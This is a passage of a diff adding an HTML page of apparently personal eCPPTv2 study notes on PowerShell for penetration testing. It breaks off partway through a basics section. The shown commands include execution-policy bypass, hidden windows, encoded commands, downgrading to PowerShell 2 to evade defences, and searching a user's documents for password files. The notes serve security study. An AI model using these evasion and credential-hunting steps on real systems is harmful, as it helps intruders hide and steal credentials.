@@ -1,0 +1,2291 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>3 - Powershell |</title>
+<meta name="description" content="Learn to reduce your footprint and evade defense mechanisms ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="3 - Powershell">
+<meta property="og:url" content="http://localhost:4000/notes/ecppt/powershell/">
+
+
+  <meta property="og:description" content="Learn to reduce your footprint and evade defense mechanisms ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header6.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-11-21T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/ecppt/powershell/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header6.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          3 - Powershell
+
+        
+      </h1>
+      
+        <p class="page__lead">eCPPTv2
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  27 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/" class="active">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="3 - Powershell">
+    <meta itemprop="description" content="eCPPTv2">
+    <meta itemprop="datePublished" content="2023-11-21T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#fundamentals">Fundamentals</a>
+    <ul>
+      <li><a href="#the-powershell-cli">The Powershell CLI</a></li>
+      <li><a href="#cmdlets">Cmdlets</a></li>
+      <li><a href="#modules">Modules</a></li>
+      <li><a href="#scripts">Scripts</a></li>
+      <li><a href="#objects">Objects</a></li>
+    </ul>
+  </li>
+  <li><a href="#offensive-powershell">Offensive PowerShell</a>
+    <ul>
+      <li><a href="#downloading-and-execution">Downloading and Execution</a></li>
+      <li><a href="#obfuscation">Obfuscation</a></li>
+      <li><a href="#information-gathering--recon">Information Gathering &amp; Recon</a></li>
+      <li><a href="#post-exploitation-with-powershell">Post-Exploitation with PowerShell</a></li>
+      <li><a href="#powershell-and-metasploit">Powershell and Metasploit</a></li>
+      <li><a href="#empire-overview">Empire Overview</a></li>
+      <li><a href="#uac-bypass-powershell-exploit-script-walkthrough">UAC Bypass PowerShell Exploit Script Walkthrough</a></li>
+      <li><a href="#lab-1---leveraging-powershell-during-exploitation">Lab 1 - Leveraging PowerShell During Exploitation</a></li>
+      <li><a href="#lab-2-powershell-for-post-exploitation-and-lateral-movement">Lab 2 Powershell for post-exploitation and Lateral Movement</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="fundamentals">Fundamentals</h1>
+
+<p>Some Tools:</p>
+
+<p>→ https://github.com/PowerShellMafia/PowerSploit
+   → https://github.com/powershell/powershell</p>
+
+<h2 id="the-powershell-cli">The Powershell CLI</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CLI = Command Line Interface
+</code></pre></div></div>
+
+<blockquote>
+  <p>powershell path</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"%appdata%\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\&lt;v1.0 = version&gt;"
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Environment]::Is64BitProcess
+True
+</code></pre></div></div>
+
+<p>64-bit PowerShell:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\wIndows\system32\WindowsPowerShell
+</code></pre></div></div>
+
+<p>32-bit PowerShell:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\windows\SysWOW64\WindowsPowerShell
+</code></pre></div></div>
+
+<h3 id="help-parameter">Help Parameter</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">/</span><span class="nf">?</span><span class="w"> 
+</span><span class="nt">-Help</span><span class="w">
+</span><span class="o">-</span><span class="nf">?</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="basic-usage">Basic Usage</h3>
+<ul>
+  <li>ExecutionPolicy
+determines which scripts if any, we can run and can easily be disabled with the “Bypass” or “Unrestricted” arguments</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-ExecutionPolicy</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="o">.</span><span class="nx">\script.ps1</span><span class="w">
+</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-ExecutionPolicy</span><span class="w"> </span><span class="nx">Unrestricted</span><span class="w"> </span><span class="o">.</span><span class="nx">\script</span><span class="p">,</span><span class="nx">ps1</span><span class="w">
+</span></code></pre></div></div>
+
+<p>-WindowStyle
+Hides the Powershell window when used the “hidden” argument</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-WindowStyle</span><span class="w"> </span><span class="nx">Hidden</span><span class="w"> </span><span class="o">.</span><span class="nx">\script.ps1</span><span class="w">
+</span></code></pre></div></div>
+
+<p>-Command
+Is used to specify a Command or Script Block to run.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="nx">Get-Process</span><span class="w">
+</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"&amp; { Get-EventLog -LogName security } "</span><span class="w">
+</span></code></pre></div></div>
+
+<p>-EncodedCommand
+is used to execute base64 encoded scripts or commands</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-EncodedCommand</span><span class="w"> </span><span class="nv">$encodedCommand</span><span class="w">
+</span></code></pre></div></div>
+
+<p>-NoProfile
+Dont load any powershell profiles
+Profiles are essentially scripts that run when the powershell executable is launched and can interfere with our operations.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-NoProfile</span><span class="w"> </span><span class="o">.</span><span class="nx">\script.ps1</span><span class="w">
+</span></code></pre></div></div>
+
+<p>-Version
+we can use followed by a version number as the argument to downgrade the version of powershell
+Useful in scenarios where you have landed on a machine with a more recent version and need to downgrade to Version 1.0 or 2.0 to complete certain tasks.</p>
+
+<p>→ Requires that older versions are still installed on the target</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-Version</span><span class="w"> </span><span class="nx">2</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="abreviations">Abreviations</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-ExecutionPolicy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nt">-ex</span><span class="w">
+</span><span class="nt">-EncodedCommand</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">-ec</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nt">-enco</span><span class="w">
+</span><span class="nt">-WindowStyle</span><span class="w"> </span><span class="kr">Hidden</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">-W</span><span class="w"> </span><span class="n">h</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nt">-Wi</span><span class="w"> </span><span class="nx">hi</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="get-help">Get-Help</h3>
+<p>Similar to linux <strong>Man Pages</strong>
+we can use to obtain information related to any function, alias, module or cmdlet that PowerShell is aware of.</p>
+
+<p>To get full help For any cmdlet, which includes detailed information on associated parameters</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Help</span><span class="w"> </span><span class="nx">Get-Process</span><span class="w"> </span><span class="nt">-Full</span><span class="w">
+</span></code></pre></div></div>
+
+<p>To show examples of a specific cmdlet</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Help</span><span class="w"> </span><span class="nx">Get-Process</span><span class="w"> </span><span class="nt">-Examples</span><span class="w">
+</span></code></pre></div></div>
+
+<p>To show Help pages online</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Help</span><span class="w"> </span><span class="nx">Get-Help</span><span class="w"> </span><span class="nt">-Online</span><span class="w">
+</span></code></pre></div></div>
+
+<p>To update the help files</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Update-Help</span><span class="w">
+</span></code></pre></div></div>
+
+<p>→ https://technet.microsoft.com/en-us/library/cc764318.aspx</p>
+
+<h3 id="get-command">Get-Command</h3>
+<p>it allows us to list all cmdlets, aliases, functions, workflows, filters, scripts and any applications that are available For us to use in PowerShell.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Command</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="o">*</span><span class="nx">Firewall</span><span class="o">*</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="cmdlets">Cmdlets</h2>
+<p>Command-lets
+its how we will leverage powershell For our offensive purposes
+cmdlets are native commands in powershell (we can also create our own)</p>
+
+<p>Typically used to return output to other cmdlets to be then processed via a pipeline (“|”)
+	https://www.petri.com/understanding-the-powershell-pipeline</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ChildItem</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Returns 4 columns names Mode, LastWriteTime, Length and Name.
+But we can pipe the output</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ChildItem</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-List</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>rather than columns and names  as seen in the previous slide, we can return all named properties associated with its objects in a different list-like format</p>
+</blockquote>
+
+<h3 id="pipelining">Pipelining</h3>
+<p>results of all cmdlets output = objects</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Sort-Object</span><span class="w"> </span><span class="nt">-Unique</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">ProcessName</span><span class="w">
+</span></code></pre></div></div>
+
+<p>like linux we can redirect the output to a file:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Sort-Object</span><span class="w"> </span><span class="nt">-Unique</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">ProcessName</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">file.txt</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="useful-cmdlets--usage">Useful Cmdlets &amp; Usage</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-Get-Process</span><span class="w">
+</span></code></pre></div></div>
+
+<p>list of all processes
+formatted in a table-like format</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-List</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span></code></pre></div></div>
+
+<p>To get all of the information (properties) associated with all of the processes</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Process</span><span class="w"> </span><span class="nx">chrome</span><span class="p">,</span><span class="w"> </span><span class="nx">firefox</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Sort-Object</span><span class="w"> </span><span class="nt">-Unique</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-List</span><span class="w"> </span><span class="nx">Path</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Further extend to get information about specific processes and paths to their executables</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Process</span><span class="w"> </span><span class="nx">chrome</span><span class="p">,</span><span class="w"> </span><span class="nx">firefox</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Sort-Object</span><span class="w"> </span><span class="nt">-Unique</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-List</span><span class="w"> </span><span class="nx">Path</span><span class="p">,</span><span class="w"> </span><span class="nx">Id</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>append another property (id)</li>
+</ul>
+
+<h3 id="alias">Alias</h3>
+<p>Most of the cmdlets have <strong>Aliases</strong>. 
+example:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ChildItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="nx">items</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">directory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="p">(</span><span class="n">exactly</span><span class="w"> </span><span class="nx">like</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">linux</span><span class="w"> </span><span class="nx">one</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<p>To find the aliases we can use: Get-Alias</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Alias</span><span class="w"> </span><span class="nt">-Definition</span><span class="w"> </span><span class="nx">Get-ChildItem</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">//</span><span class="w"> </span><span class="nx">dir</span><span class="w"> </span><span class="nx">//</span><span class="w"> </span><span class="nx">gci</span><span class="w"> </span><span class="nx">//</span><span class="w"> </span><span class="nx">ls</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="get-wmiobject">Get-WmiObject</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-class</span><span class="w"> </span><span class="nx">win32_operatingsystem</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-class</span><span class="w"> </span><span class="nx">win32_operatingsystem</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span></code></pre></div></div>
+<ul>
+  <li>using the Format-List alias “fl”</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-class</span><span class="w"> </span><span class="nx">win32_service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span></code></pre></div></div>
+
+<p>detailed list of properties For all services</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-class</span><span class="w"> </span><span class="nx">win32_service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Sort-Object</span><span class="w"> </span><span class="nt">-Unique</span><span class="w"> </span><span class="nx">PathName</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w"> </span><span class="nx">PathName</span><span class="w">
+</span></code></pre></div></div>
+
+<p>expanding the filter with PathName</p>
+
+<h3 id="export-csv">Export-Csv</h3>
+<p>saving the information that we are gathering to a file
+we can redirect operator (&gt;)</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-class</span><span class="w"> </span><span class="nx">win32_operatingsystem</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Export-Csv</span><span class="w"> </span><span class="nx">C:\file.csv</span><span class="w">
+</span></code></pre></div></div>
+
+<p>// to save to CSV format</p>
+
+<h3 id="exploring-the-registry">Exploring the Registry</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">HKLM:\</span><span class="w">
+</span><span class="n">//</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">alias</span><span class="w"> </span><span class="nx">For</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">Set-Location</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="o">.</span><span class="nx">\SOFTWARE\Microsoft\Windows\CurrentVersion\</span><span class="w">
+</span><span class="n">ls</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="select-string">Select-String</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Select-String</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\users\user\Documents\</span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="nt">-Pattern</span><span class="w"> </span><span class="nx">pass</span><span class="o">*</span><span class="w">
+</span></code></pre></div></div>
+
+<p>// search For .txt files named pass* in a directory</p>
+
+<h3 id="get-content">Get-Content</h3>
+<p>we can use to display the full content of the file</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="n">Get-Content</span><span class="w"> </span><span class="nx">C:\Users\user\Documents\passwords.txt</span><span class="w">
+
+</span><span class="n">ls</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="nx">C:\users\user\Documents</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="p">{</span><span class="n">sls</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="nt">-Pattern</span><span class="w"> </span><span class="nx">pass</span><span class="o">*</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span><span class="n">ls</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">alias</span><span class="w"> </span><span class="nx">For</span><span class="w"> </span><span class="s2">"Get-ChildItem"</span><span class="w">
+</span><span class="o">%</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">alias</span><span class="w"> </span><span class="nx">For</span><span class="w"> </span><span class="s2">"ForEach-Object"</span><span class="w">
+</span><span class="n">sls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">alias</span><span class="w"> </span><span class="nx">For</span><span class="w"> </span><span class="s2">"Select-String"</span><span class="w">
